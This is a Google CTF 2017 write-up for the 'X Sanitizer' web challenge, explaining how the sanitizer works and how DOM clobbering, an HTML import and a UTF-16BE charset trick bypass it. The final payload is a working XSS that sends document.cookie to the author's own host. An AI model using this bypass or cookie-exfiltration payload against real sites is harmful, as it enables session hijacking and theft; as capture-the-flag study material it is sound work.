---
title: Google CTF 2017 – The X Sanitizer writeup
author: tyage
type: posts
date: 2017-06-25T15:57:35+00:00
url: /?p=990
wp-syntax-cache-content:
  - |
    a:4:{i:1;s:2958:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;">onload <span style="color: #339933;">=</span> _<span style="color: #339933;">=&gt;</span> setTimeout<span style="color: #009900;">&#40;</span>_<span style="color: #339933;">=&gt;</span> parent.<span style="color: #660066;">postMessage</span><span style="color: #009900;">&#40;</span>document.<span style="color: #660066;">body</span>.<span style="color: #660066;">innerHTML</span><span style="color: #339933;">,</span> location.<span style="color: #660066;">origin</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">1000</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    remove <span style="color: #339933;">=</span> node <span style="color: #339933;">=&gt;</span> <span style="color: #009900;">&#40;</span>node <span style="color: #339933;">==</span> document<span style="color: #009900;">&#41;</span> <span style="color: #339933;">?</span> document.<span style="color: #660066;">body</span>.<span style="color: #660066;">innerHTML</span> <span style="color: #339933;">=</span> <span style="color: #3366CC;">''</span> <span style="color: #339933;">:</span> node.<span style="color: #660066;">parentNode</span>.<span style="color: #660066;">removeChild</span><span style="color: #009900;">&#40;</span>node<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    document.<span style="color: #660066;">addEventListener</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;securitypolicyviolation&quot;</span><span style="color: #339933;">,</span> e <span style="color: #339933;">=&gt;</span> remove<span style="color: #009900;">&#40;</span>e.<span style="color: #660066;">target</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    document.<span style="color: #660066;">write</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src <span style="color: #000099; font-weight: bold;">\\</span>'</span>none\\<span style="color: #3366CC;">'; script-src *&quot;&gt;&lt;body&gt;'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td></tr></table><p class="theCode" style="display:none;">onload = _=&gt; setTimeout(_=&gt; parent.postMessage(document.body.innerHTML, location.origin), 1000);
    remove = node =&gt; (node == document) ? document.body.innerHTML = '' : node.parentNode.removeChild(node);
    document.addEventListener(&quot;securitypolicyviolation&quot;, e =&gt; remove(e.target));
    document.write('&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src \\'none\\'; script-src *&quot;&gt;&lt;body&gt;');</p></div>
    ";i:2;s:1070:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;">with<span style="color: #009900;">&#40;</span>document<span style="color: #009900;">&#41;</span> remove<span style="color: #009900;">&#40;</span>document <span style="color: #339933;">===</span> currentScript.<span style="color: #660066;">ownerDocument</span> <span style="color: #339933;">?</span> currentScript <span style="color: #339933;">:</span> querySelector<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'link[rel=&quot;import&quot;]'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    <span style="color: #006600; font-style: italic;">// &lt;script src=x&gt;&lt;/script&gt;</span></pre></td></tr></table><p class="theCode" style="display:none;">with(document) remove(document === currentScript.ownerDocument ? currentScript : querySelector('link[rel=&quot;import&quot;]'));
    // &lt;script src=x&gt;&lt;/script&gt;</p></div>
    ";i:3;s:362:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;form name=remove&gt;&lt;/form&gt;
    &lt;link rel=import href=//tyage.net&gt;</pre></td></tr></table><p class="theCode" style="display:none;">&lt;form name=remove&gt;&lt;/form&gt;
    &lt;link rel=import href=//tyage.net&gt;</p></div>
    ";i:4;s:1204:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;form name=currentScript&gt;&lt;/form&gt;
    &lt;link rel=&quot;import&quot; href=&quot;/sandbox?html=&lt;script src=%22/sandbox%3Fhtml=%2500%3D%25001%2500;%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500.%2500h%2500r%2500e%2500f%2500%3D%2500%2522%2500/%2500/%2500t%2500y%2500a%2500g%2500e%2500.%2500n%2500e%2500t%2500/%2500%2522%2500+%2500(%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%2500)%22 charset=%22%55TF-16BE%22&gt;&lt;/script&gt;&quot;&gt;</pre></td></tr></table><p class="theCode" style="display:none;">&lt;form name=currentScript&gt;&lt;/form&gt;
    &lt;link rel=&quot;import&quot; href=&quot;/sandbox?html=&lt;script src=%22/sandbox%3Fhtml=%2500%3D%25001%2500;%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500.%2500h%2500r%2500e%2500f%2500%3D%2500%2522%2500/%2500/%2500t%2500y%2500a%2500g%2500e%2500.%2500n%2500e%2500t%2500/%2500%2522%2500+%2500(%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%2500)%22 charset=%22%55TF-16BE%22&gt;&lt;/script&gt;&quot;&gt;</p></div>
    ";}
categories:
  - CTF

---
<h2>Overview</h2>
<p>Problem page:<br />
<a href="https://sanitizer.web.ctfcompetition.com">https://sanitizer.web.ctfcompetition.com</a></p>
<p>Copy of source code:<br />
<a href="https://gist.github.com/tyage/6eabacf6001bd068287842b1052132e4">https://gist.github.com/tyage/6eabacf6001bd068287842b1052132e4</a></p>
<p>The application sanitize input and render it.</p>
<h2>Sanitizing method</h2>
<p>The method of sanitizing is follow:</p>
<p>1. Remove the words that match with <code><i>/meta|srcdoc|utf-16be/i</i></code> from input.<br />
2. Register a ServiceWorker then, render input in iframe<br />
3. In iframe, it load <code>&lt;script src=sanitize&gt;</code> which executes the following code:</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;">onload <span style="color: #339933;">=</span> _<span style="color: #339933;">=&gt;</span> setTimeout<span style="color: #009900;">&#40;</span>_<span style="color: #339933;">=&gt;</span> parent.<span style="color: #660066;">postMessage</span><span style="color: #009900;">&#40;</span>document.<span style="color: #660066;">body</span>.<span style="color: #660066;">innerHTML</span><span style="color: #339933;">,</span> location.<span style="color: #660066;">origin</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">1000</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
remove <span style="color: #339933;">=</span> node <span style="color: #339933;">=&gt;</span> <span style="color: #009900;">&#40;</span>node <span style="color: #339933;">==</span> document<span style="color: #009900;">&#41;</span> <span style="color: #339933;">?</span> document.<span style="color: #660066;">body</span>.<span style="color: #660066;">innerHTML</span> <span style="color: #339933;">=</span> <span style="color: #3366CC;">''</span> <span style="color: #339933;">:</span> node.<span style="color: #660066;">parentNode</span>.<span style="color: #660066;">removeChild</span><span style="color: #009900;">&#40;</span>node<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
document.<span style="color: #660066;">addEventListener</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;securitypolicyviolation&quot;</span><span style="color: #339933;">,</span> e <span style="color: #339933;">=&gt;</span> remove<span style="color: #009900;">&#40;</span>e.<span style="color: #660066;">target</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
document.<span style="color: #660066;">write</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src <span style="color: #000099; font-weight: bold;">\\</span>'</span>none\\<span style="color: #3366CC;">'; script-src *&quot;&gt;&lt;body&gt;'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td></tr></table></div>

<p>4. The code removes the node which violates CSP.<br />
5. To prevent loading the attacker&#8217;s script, ServiceWorker overrides the response of contents as following code:</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;">with<span style="color: #009900;">&#40;</span>document<span style="color: #009900;">&#41;</span> remove<span style="color: #009900;">&#40;</span>document <span style="color: #339933;">===</span> currentScript.<span style="color: #660066;">ownerDocument</span> <span style="color: #339933;">?</span> currentScript <span style="color: #339933;">:</span> querySelector<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'link[rel=&quot;import&quot;]'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #006600; font-style: italic;">// &lt;script src=x&gt;&lt;/script&gt;</span></pre></td></tr></table></div>

<p>6. This code remove currentScript or html import element.<br />
7. Now, <code>doument.body</code> returns an sanitized html!</p>
<h2>Evade from sanitization</h2>
<p>But wait, why google uses <code>with(document)</code> ? (It is deprecated.)<br />
Then, I thought I can disable the execution of <code>document.remove</code> by using the technique of <a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/hotcows-dating">HotCows Dating</a></p>
<p>OK. Let&#8217;s input the html below and confirm that it is not sanitized.</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;form name=remove&gt;&lt;/form&gt;
&lt;link rel=import href=//tyage.net&gt;</pre></td></tr></table></div>

<h2>Execute payload</h2>
<p>But sadly, the content which html import load is overrode by ServiceWorker.</p>
<p>So some techniques are needed to execute attacker&#8217;s script.</p>
<p>Soon, I realized that we can import the url: <code>/sanitize?html=URL_ENCODED_HTML</code>.<br />
And <code>URL_ENCODED_HTML</code> can be a string that is not matched with <code><i>/meta|srcdoc|utf-16be/i</i></code> (e.g. <code><%6deta></code>).</p>
<p>Next, we use <code>utf-16be</code> to execute our payload.</p>
<p>Here is useful link: <a href="http://masatokinugawa.l0.cm/2012/05/utf-16content-security-policy.html">http://masatokinugawa.l0.cm/2012/05/utf-16content-security-policy.html</a></p>
<p><code>/sandbox?html=%00=\x00a\x00l\x00e\x00r\x00t\x00(\x001\x00)</code> returns <code><i>&lt;!doctype HTML&gt;\n&lt;script src=sanitize&gt;\n&lt;/script&gt;\n&lt;body&gt;\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x001\x00)</i></code>.</p>
<p>When charset is <code>utf-16be</code>, it is interpreted as <code><i>㰡摯捴祰攠䡔䵌㸊㱳捲楰琠獲挽獡湩瑩穥㸊㰯獣物灴㸊㱢潤社=alert(1)</i></code></p>
<p>OK, now we can get flag in cookie!</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">&lt;form name=currentScript&gt;&lt;/form&gt;
&lt;link rel=&quot;import&quot; href=&quot;/sandbox?html=&lt;script src=%22/sandbox%3Fhtml=%2500%3D%25001%2500;%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500.%2500h%2500r%2500e%2500f%2500%3D%2500%2522%2500/%2500/%2500t%2500y%2500a%2500g%2500e%2500.%2500n%2500e%2500t%2500/%2500%2522%2500+%2500(%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%2500)%22 charset=%22%55TF-16BE%22&gt;&lt;/script&gt;&quot;&gt;</pre></td></tr></table></div>

<p>flag is: <code>CTF{no-problem-this-can-be-fixed-by-adding-a-single-if}</code></p>
